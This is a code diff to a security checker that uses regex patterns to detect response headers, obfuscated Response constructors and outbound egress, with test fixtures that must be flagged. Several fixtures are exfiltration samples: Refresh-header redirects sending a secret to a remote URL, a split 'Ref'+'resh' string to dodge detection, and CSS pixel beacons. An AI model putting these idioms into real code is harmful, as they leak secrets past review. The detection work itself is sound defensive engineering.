@@ -2052,8 +2052,13 @@ function hasAiRuntimeBoundary(content, path = "") {
   const hasNavigationHeaderSink = /\bheaders\s*:\s*\{[^}]*?(?:["'`]?(?:refresh|location)["'`]?|\[\s*["'`](?:refresh|location)["'`]\s*\])\s*:/i.test(normalizedContent)
     || /\.(?:set|append)\s*\(\s*["'`](?:refresh|location)["'`]/i.test(normalizedContent)
     || /\[\s*["'`](?:refresh|location)["'`]\s*,/i.test(normalizedContent);
-  const hasUnreviewedResponseCapability = !responseCapabilityPinnedFiles.has(path)
-    && /\b(?:Response|Headers)\b/.test(normalizedContent);
+  const hasObscuredResponseCapability = /\bnew\s*\(\s*(?:Response|Headers)\s*\)/.test(normalizedContent)
+    || /=\s*(?:\(\s*)*(?:Response|Headers)\b/.test(normalizedContent)
+    || /\b(?:Response|Headers)\.(?:bind|call|apply)\b/.test(normalizedContent);
+  const hasComputedResponseHeader = /\bheaders\s*:\s*\{[^}]*\[[^\]]+\]\s*:/i.test(normalizedContent)
+    || /\bnew\s+Headers\s*\(\s*\{[^}]*\[[^\]]+\]\s*:/i.test(normalizedContent);
+  const hasUnreviewedResponseCapability = hasObscuredResponseCapability || hasComputedResponseHeader
+    || (!responseCapabilityPinnedFiles.has(path) && /\b(?:Response|Headers)\b/.test(normalizedContent));
   const hasUnapprovedOutboundCapability = (
     /["'`](?:cloudflare:sockets|node:(?:http|https|http2|net|tls|dgram|dns)|(?:http|https|http2|net|tls|dgram|dns))["'`]/.test(normalizedContent)
     || /\bHTMLRewriter\b/.test(normalizedContent)
@@ -2323,6 +2328,8 @@ for (const fixture of [
   { content: 'return new Response("", { headers: [[`Refresh`, `0; url=${env.REMOTE_URL}?data=${secret}`]] });', path: "apps/worker/src/provider.ts" },
   { content: 'const headers = new Headers({ Refresh: `0; url=${env.REMOTE_URL}?data=${secret}` }); return new Response("", { headers });', path: "apps/worker/src/provider.ts" },
   { content: 'const name = "Ref" + "resh"; return new (Response)("", { headers: { [name]: `0; url=${env.REMOTE_URL}?data=${secret}` } });', path: "apps/worker/src/provider.ts" },
+  { content: 'const name = "Ref" + "resh"; return new (Response)("", { headers: { [name]: `0; url=${env.REMOTE_URL}?data=${secret}` } });', path: "apps/worker/src/capture-router.ts" },
+  { content: 'const name = "Ref" + "resh"; return new Response("", { headers: { [name]: `0; url=${env.REMOTE_URL}?data=${secret}` } });', path: "apps/worker/src/capture-router.ts" },
   { content: '<div style="background:u\\\\72l(//api.groq.com/pixel)"></div>', path: "apps/brand-site/public/css-escape-egress.html" },
   { content: '<div style="background-image:image-set(\'//api.groq.com/pixel\' 1x)"></div>', path: "apps/brand-site/public/css-image-set-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
